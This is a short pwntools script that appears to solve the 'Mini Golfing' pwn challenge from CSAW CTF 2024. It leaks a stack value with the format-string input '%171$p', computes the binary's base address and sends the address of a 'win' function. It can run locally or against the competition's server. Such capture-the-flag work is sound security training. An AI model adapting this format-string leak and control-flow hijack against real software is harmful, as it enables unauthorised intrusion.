#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/CSAW CTF Qualification Round 2024/pwn/Mini Golfing/golf')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.sendlineafter(b'name? ', b'%171$p')
    r.recvuntil(b'hello: ')

    elf.address = int(r.recvline().strip(), 16) - elf.sym.main

    r.sendlineafter(b'at!: ', hex(elf.sym.win))

    print(r.recv())
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('golfing.ctf.csaw.io', 9999)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
